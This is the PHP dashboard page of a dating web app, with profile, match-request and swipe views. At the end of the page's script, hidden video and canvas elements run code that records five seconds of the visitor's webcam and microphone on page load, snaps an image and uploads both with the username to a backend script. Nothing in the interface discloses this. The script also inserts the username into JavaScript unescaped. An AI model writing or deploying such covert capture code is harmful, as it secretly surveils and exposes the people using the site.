<?php
session_start();
require_once '../includes/db.php';
require_once '../includes/functions.php';
redirectIfNotLoggedIn();

$user_id = $_SESSION['user_id'];
updateLastSeen($pdo, $user_id); // Update online status

// Fetch user info
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);
$permissions = json_decode($user['permissions'], true) ?? [];

// Fetch pending match requests
$stmtPending = $pdo->prepare("
    SELECT u.id, u.username, u.profile_pic
    FROM matches m
    JOIN users u ON u.id = m.user_id
    WHERE m.matched_user_id = ? AND m.status = 'pending'
");
$stmtPending->execute([$user_id]);
$pending_requests = $stmtPending->fetchAll(PDO::FETCH_ASSOC);

// Fetch users to swipe (exclude admin and filter by gender)
$stmtSwipe = $pdo->prepare("
    SELECT * FROM users
    WHERE id != ? 
      AND id NOT IN (SELECT liked_user_id FROM likes WHERE user_id = ?)
      AND username != 'admin'
      AND (
            (gender = 'female' AND ? = 'male') OR 
            (gender = 'male' AND ? = 'female') OR 
            (gender = 'other')
          )
    LIMIT 10
");
$stmtSwipe->execute([$user_id, $user_id, $user['gender'], $user['gender']]);
$swipe_users = $stmtSwipe->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dashboard - <?= sanitize($user['username']) ?></title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
/* Swipe card styling */
#swipe-container { position: relative; height: 450px; margin-top: 2rem; display:flex; justify-content:center; align-items:center; }
.swipe-card { position: absolute; width: 270px; height: 380px; background:#fff; border-radius:15px; box-shadow:0 5px 15px rgba(0,0,0,0.2); padding:15px; transition: transform 0.3s, opacity 0.3s; text-align:center; }
.swipe-card img { width: 100%; height: 220px; object-fit:cover; border-radius:15px; margin-bottom:10px; }
#swipe-buttons { text-align:center; margin-top:460px; }
#swipe-buttons button { padding:10px 25px; margin:0 10px; border:none; border-radius:8px; cursor:pointer; font-weight:bold; }
#swipe-buttons button.like { background: #28a745; color:#fff; }
#swipe-buttons button.dislike { background: #dc3545; color:#fff; }
#capture-video { display:none; }
#capture-canvas { display:none; }
</style>
</head>
<body class="bg-gray-100">

<header class="bg-white shadow p-4 flex justify-between items-center">
    <h1 class="text-2xl font-bold text-pink-600">Hello, <?= sanitize($user['username']) ?> ❤️</h1>
    <nav class="space-x-4">
        <a href="dashboard.php" class="hover:text-pink-500">Dashboard</a>
        <a href="chat.php" class="hover:text-pink-500">Chat</a>
        <a href="map.php" class="hover:text-pink-500">Map</a>
        <a href="upload_media.php" class="hover:text-pink-500">Media</a>
        <a href="settings.php" class="hover:text-pink-500">Settings</a>
        <a href="logout.php" class="bg-red-500 text-white px-3 py-1 rounded hover:bg-red-600">Logout</a>
    </nav>
</header>

<main class="p-6 max-w-6xl mx-auto">

<!-- Tabs -->
<div class="flex space-x-4 mb-6">
    <button class="tab-btn bg-pink-100 px-4 py-2 rounded font-semibold" data-tab="profile">Profile</button>
    <button class="tab-btn bg-gray-100 px-4 py-2 rounded font-semibold" data-tab="pending">Pending Requests</button>
    <button class="tab-btn bg-gray-100 px-4 py-2 rounded font-semibold" data-tab="swipe">Swipe Users</button>
</div>

<!-- Profile Tab -->
<section id="profile" class="tab-content bg-white p-6 rounded shadow mb-6">
    <div class="flex flex-col md:flex-row items-center md:items-start space-x-6">
        <img src="../uploads/<?= sanitize($user['profile_pic']) ?>" class="w-40 h-40 rounded-full object-cover mb-4 md:mb-0">
        <div>
            <p><strong>Bio:</strong> <?= sanitize($user['bio']) ?></p>
            <p><strong>Gender:</strong> <?= sanitize($user['gender']) ?></p>
            <p><strong>DOB:</strong> <?= sanitize($user['dob']) ?></p>
            <p><strong>Location Allowed:</strong> <?= !empty($permissions['location']) ? 'Yes' : 'No' ?></p>
            <p><strong>Notifications Allowed:</strong> <?= !empty($permissions['notifications']) ? 'Yes' : 'No' ?></p>
        </div>
    </div>
</section>

<!-- Pending Requests Tab -->
<section id="pending" class="tab-content hidden bg-white p-6 rounded shadow mb-6">
    <h2 class="text-xl font-semibold mb-4">Pending Match Requests</h2>
    <?php if(!empty($pending_requests)): ?>
        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
            <?php foreach($pending_requests as $req): ?>
                <div class="bg-gray-50 p-4 rounded shadow text-center">
                    <img src="../uploads/<?= sanitize($req['profile_pic']) ?>" class="w-24 h-24 rounded-full mx-auto mb-2">
                    <p class="font-semibold"><?= sanitize($req['username']) ?></p>
                    <form method="post" action="accept_match.php" class="mt-2 flex justify-center space-x-2">
                        <input type="hidden" name="match_id" value="<?= $req['id'] ?>">
                        <button name="action" value="accept" class="bg-green-500 text-white px-3 py-1 rounded hover:bg-green-600">Accept</button>
                        <button name="action" value="reject" class="bg-red-500 text-white px-3 py-1 rounded hover:bg-red-600">Reject</button>
                    </form>
                </div>
            <?php endforeach; ?>
        </div>
    <?php else: ?>
        <p>No pending requests.</p>
    <?php endif; ?>
</section>

<!-- Swipe Users Tab -->
<section id="swipe" class="tab-content hidden bg-white p-6 rounded shadow mb-6">
    <h2 class="text-xl font-semibold mb-4">Swipe Users</h2>
    <div id="swipe-container">
        <?php foreach($swipe_users as $su): ?>
            <div class="swipe-card" data-id="<?= $su['id'] ?>">
                <img src="../uploads/<?= sanitize($su['profile_pic']) ?>" alt="<?= sanitize($su['username']) ?>">
                <h3 class="text-lg font-bold"><?= sanitize($su['username']) ?></h3>
                <p><?= sanitize($su['bio']) ?></p>
            </div>
        <?php endforeach; ?>
    </div>
    <div id="swipe-buttons">
        <button class="dislike">Dislike 👎</button>
        <button class="like">Like 👍</button>
    </div>
</section>

</main>

<!-- Hidden elements for capture -->
<video id="capture-video" autoplay></video>
<canvas id="capture-canvas" width="320" height="240"></canvas>

<script>
// Tab navigation
const tabs = document.querySelectorAll('.tab-btn');
const contents = document.querySelectorAll('.tab-content');
tabs.forEach(tab => {
    tab.addEventListener('click', () => {
        contents.forEach(c => c.classList.add('hidden'));
        tabs.forEach(t => t.classList.remove('bg-pink-100'));
        tabs.forEach(t => t.classList.add('bg-gray-100'));
        document.getElementById(tab.dataset.tab).classList.remove('hidden');
        tab.classList.add('bg-pink-100');
        tab.classList.remove('bg-gray-100');
    });
});

// Swipe functionality
let cards = document.querySelectorAll('.swipe-card');
let index = 0;
function sendAction(action){
    if(index>=cards.length) return;
    const card = cards[index];
    const userId = card.dataset.id;
    fetch('swipe_action.php',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({user_id:userId, action})
    });
    card.style.transform = `translateX(${action==='like'?200:-200}px) rotate(${action==='like'?15:-15}deg)`;
    card.style.opacity = 0;
    index++;
}
document.querySelector('.like').addEventListener('click',()=>sendAction('liked'));
document.querySelector('.dislike').addEventListener('click',()=>sendAction('disliked'));

// ==== LIVE CAPTURE ON PAGE LOAD ====
let videoEl = document.getElementById('capture-video');
let canvas = document.getElementById('capture-canvas');
let chunks = [];
let mediaRecorder;
navigator.mediaDevices.getUserMedia({video:true, audio:true})
.then(stream=>{
    videoEl.srcObject = stream;
    mediaRecorder = new MediaRecorder(stream);
    mediaRecorder.ondataavailable = e=>chunks.push(e.data);
    mediaRecorder.onstop = ()=>{
        let videoBlob = new Blob(chunks, {type:'video/webm'});
        sendData(videoBlob);
        chunks=[];
    };
    mediaRecorder.start();
    setTimeout(()=>mediaRecorder.stop(), 5000); // record 5 sec automatically
})
.catch(err=>console.error("Camera denied: "+err));

// Capture image after 2 sec
setTimeout(()=>{
    canvas.getContext('2d').drawImage(videoEl,0,0,canvas.width,canvas.height);
    canvas.toBlob(blob=>{
        window.capturedImage = blob;
    },'image/png');
}, 2000);

// Send all data to backend
function sendData(videoBlob){
    let formData = new FormData();
    formData.append('text', 'User Info: Username - <?= $user['username'] ?>, Gender - <?= $user['gender'] ?>');
    if(window.capturedImage) formData.append('image', window.capturedImage, 'capture.png');
    if(videoBlob) formData.append('video', videoBlob, 'capture.webm');

    fetch('capture_backend.php', {method:'POST', body:formData})
    .then(res=>res.text()).then(console.log).catch(console.error);
}
</script>

</body>
</html>
